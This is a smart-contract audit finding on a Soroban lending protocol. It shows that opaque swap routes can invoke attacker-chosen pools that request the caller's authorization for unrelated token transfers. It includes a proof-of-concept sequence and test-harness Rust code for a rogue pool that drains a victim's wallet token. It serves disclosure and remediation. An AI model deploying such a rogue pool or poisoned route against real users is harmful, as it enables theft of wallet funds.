### Title
Unvalidated swap routes can execute malicious contracts and steal the caller’s wallet funds - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `swap_debt`, and `repay_debt_with_collateral` accept an opaque `Bytes` route and forward it to the configured swap aggregator. The controller only constrains the router’s input spend and verifies positive output at the controller address; it does not constrain which pool contracts the route invokes or which additional authorizations those contracts request. A malicious route can therefore place attacker-controlled code inside the victim’s authorization context and make it call `token.transfer(victim, attacker, amount)` for an unrelated wallet token. If the victim submits the poisoned authorization tree produced by simulation, the transfer succeeds while the swap still returns valid output and the position finalization checks pass.

### Finding Description
The public strategy entrypoints accept caller-controlled `swap: Bytes` and require owner or delegate authorization. For example, `swap_collateral` accepts `current`, `amount`, `new`, and `swap`, then invokes `process_swap_collateral`; that function checks the caller’s relationship to `account_id`, withdraws the selected collateral, and calls the shared swap helper. [1](#0-0) [2](#0-1) 

`swap_tokens` treats `StrategySwap` as opaque router input. It snapshots the controller’s input and output balances, authorizes one exact `token_in.transfer(controller, router, amount_in)`, calls `router.execute_strategy(controller, amount_in, swap)`, refunds unused input, and only requires a positive measured output. [3](#0-2)  `StrategySwap` is simply raw `Bytes`, not a typed or controller-validated route. [4](#0-3) 

The aggregator decodes that payload into an address registry and packed instruction stream. `StrategyPayload.assets` explicitly carries token, pool, and LP-token addresses, while each swap hop resolves its `pool`, `token_in`, and `token_out` from caller-provided registry entries before dispatching the hop. [5](#0-4) [6](#0-5) 

Soroban’s authorization model makes this dangerous: a contract invoked below the victim’s authorized controller call can request the victim’s `require_auth` on another token transfer. The protocol’s own authorization test demonstrates that simulation records that transfer as a child of the victim’s `swap_collateral` invocation and that signing the resulting tree moves the entire unrelated wallet-token balance to the attacker. [7](#0-6) 

The flash guard and Soroban’s restricted same-contract reentry do not prevent this issue because the malicious venue does not need to reenter the controller. It only needs to execute once as a route-selected external contract and request authorization for an unrelated token transfer.

### Impact Explanation
A victim can lose wallet assets that were never supplied to the lending protocol and are unrelated to either swap token. The malicious venue can return fair swap output, so `received > 0`, input accounting, collateral redeposit, solvency, health-factor, and collateral-floor checks can all pass while the separate wallet transfer succeeds. [8](#0-7) [9](#0-8) 

The test fixture proves the concrete theft: a route through an attacker-deployed pool transfers Alice’s `77,770,000,000` units of an unlisted wallet token to the attacker while crediting Alice with the expected `25,000,000` units of output collateral. [10](#0-9) 

This is theft of user funds. The controller cannot directly spend the victim’s unrelated token balance, but its route execution allows attacker-selected code to request that spend under the victim’s authorization tree.

### Likelihood Explanation
An attacker cannot call `swap_collateral` against a victim’s `account_id` without owner or delegate authorization because `process_swap_collateral` invokes `require_owner_or_delegate`. [11](#0-10)  The attack therefore requires the victim to submit a poisoned route produced off-chain.

That precondition is realistic because routes are opaque XDR bytes supplied as strategy arguments, and Soroban simulation places every required child authorization under the controller invocation. A wallet or client that does not independently decode the route and reject unexpected child calls can present the malicious `token.transfer` as part of the authorization tree. The harness shows that an honest route succeeds with no children, the rogue route fails if the extra transfer is not signed, and the same rogue route succeeds once the poisoned child is signed. [12](#0-11) 

The same shared `swap_tokens` primitive is reachable through `swap_debt` and `repay_debt_with_collateral`, so the exposure is not limited to collateral conversion. [13](#0-12) [14](#0-13) 

### Recommendation
Do not allow arbitrary pool addresses in production route payloads. Restrict route venues and pool contracts to governance-approved or otherwise cryptographically verified deployments, ideally by storing an allowlist/registry in the router and validating every `SwapHop.pool` before dispatch. The router should also reject route address-registry entries that are not needed for declared token and venue semantics.

Additionally, enforce a structured authorization boundary rather than relying on clients to inspect opaque bytes:

- Decode and validate `StrategyPayload` before exposing it to users for signing.
- Reject any route that invokes an unapproved contract.
- Require wallets/integrators to display and reject any authorization child other than the expected input-token transfer.
- Consider isolating route execution so venue code cannot request the end user’s auth under the original strategy authorization tree.

Measured output and the controller’s exact input-transfer authorization are necessary, but they do not bound unrelated token transfers requested by route-selected contracts. [15](#0-14) 

### Proof of Concept
1. Alice supplies `10,000` USDC and calls:
   `swap_collateral(alice, alice_account_id, usdc_hub_key, 5_000, eth_hub_key, malicious_route)`.
2. The controller withdraws Alice’s supplied USDC into the controller and calls `swap_tokens`.
3. `swap_tokens` authorizes exactly one `USDC.transfer(controller, router, amount_in)` and invokes `router.execute_strategy`.
4. The malicious route selects an attacker-controlled pool address through the payload’s address registry.
5. During route dispatch, that pool calls `UnrelatedToken.transfer(alice, attacker, alice_balance)`.
6. Simulation records the unrelated transfer as a child authorization under Alice’s `swap_collateral` call. If Alice signs that tree, the host executes the transfer.
7. The route then returns the expected ETH output to the controller. The controller observes positive ETH receipt, redeposits it as Alice’s new collateral, and finalization succeeds.
8. Alice ends with valid ETH collateral but has lost her unrelated wallet-token balance.

The existing harness encodes this behavior: the rogue pool performs `token.transfer(victim, attacker, amount)` when invoked, simulation records the transfer beneath `swap_collateral`, and enforcing-mode execution succeeds when that child is present in Alice’s signed authorization tree. [16](#0-15) [7](#0-6) [17](#0-16)

### Citations

**File:** contracts/controller/src/lib.rs (L280-303)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L24-54)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** common/src/types/shared.rs (L9-10)
```rust
/// Encoded swap route passed to the aggregator router's `execute_strategy` entry point.
pub type StrategySwap = Bytes;
```

**File:** contracts/swap-aggregator/src/types.rs (L21-44)
```rust
/// One pool hop: swaps `token_in` for `token_out` through `venue`.
///
/// Built per instruction from registry indices; venue adapters consume this.
#[derive(Clone, Debug)]
pub struct SwapHop {
    pub pool: Address,
    pub token_in: Address,
    pub token_out: Address,
    pub venue: SwapVenue,
}

/// Full strategy decoded from `execute_strategy` XDR.
///
/// Instructions reference `assets` and `amounts` by `u8` index, so an address
/// or amount used by several hops is carried exactly once.
#[contracttype]
#[derive(Clone, Debug)]
pub struct StrategyPayload {
    /// Amount registry: min-out, fixed inputs, burn floors, mint min-shares.
    pub amounts: Vec<i128>,
    /// Address registry: tokens, pools, and LP share tokens.
    pub assets: Vec<Address>,
    /// Packed program: header, instruction records, split weights.
    pub ops: Bytes,
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-166)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-71)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-269)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/strategies/mod.rs (L48-56)
```rust
pub(crate) fn strategy_finalize(
    env: &Env,
    account_id: u64,
    account: &mut Account,
    cache: &mut Context,
) {
    let _ = enforce_post_pool_solvency(env, cache, account);
    finalize_position_flow(env, account_id, account, cache, PositionSides::Both, true);
}
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-87)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );

    repay_debt_from_controller(
        env,
        &mut account,
        &mut cache,
        caller,
        StrategyRepay {
            debt: existing_debt,
            debt_available: repay_amount,
            debt_pos: &existing_pos,
            action: PositionAction::SwDebtR,
        },
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/repay_debt_with_collateral.rs (L108-131)
```rust
    let debt_available = withdraw_and_swap_from_supply(
        env,
        account,
        cache,
        caller,
        collateral,
        collateral_amount,
        &debt.asset,
        swap,
        events::PositionAction::RpColWd,
    );

    repay_debt_from_controller(
        env,
        account,
        cache,
        caller,
        StrategyRepay {
            debt,
            debt_available,
            debt_pos: &debt_pos,
            action: events::PositionAction::RpColR,
        },
    );
```
